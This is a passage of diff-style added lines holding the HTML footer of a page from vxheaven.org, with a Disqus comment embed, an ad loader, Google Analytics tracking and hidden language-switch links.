+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vci00">de</a><a href="/lib/index.php?lang=en&amp;id=vci00">en</a><a href="/lib/index.php?lang=es&amp;id=vci00">es</a><a href="/lib/index.php?lang=it&amp;id=vci00">it</a><a href="/lib/index.php?lang=fr&amp;id=vci00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vci00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vci00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vci00">ua</a></div>
+</body>
+</html>
